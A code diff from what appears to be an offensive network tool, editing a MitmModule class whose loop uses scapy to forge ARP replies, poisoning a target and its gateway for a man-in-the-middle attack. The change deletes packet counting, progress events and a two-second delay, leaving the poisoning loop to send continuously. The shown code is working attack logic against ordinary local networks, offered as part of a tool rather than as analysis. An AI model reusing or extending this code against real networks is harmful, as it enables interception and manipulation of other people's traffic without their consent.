@@ -236,8 +236,6 @@ class MitmModule(BaseModule):
                 self.is_poisoning = False
                 return
             
-            packet_count = 0
-            
             while self.is_poisoning:
                 # Poison target (tell target that we are the gateway)
                 arp_target = scapy.ARP(
@@ -258,22 +256,6 @@ class MitmModule(BaseModule):
                     hwsrc=network.get_adapter_mac(iface.ADAPTER_NAME)
                 )
                 scapy.send(arp_gateway, verbose=False)
-                
-                packet_count += 2
-                
-                # Send progress
-                if packet_count % 100 == 0:
-                    self.send_event("attack_progress", {
-                        "packets_sent": packet_count,
-                        "target": self.target_ip
-                    })
-                
-                import time
-                time.sleep(2)
-            
-            self.send_event("attack_stopped", {
-                "total_packets": packet_count
-            })
             
         except Exception as e:
             print(f"[{self.module_name}] Poison error: {e}")
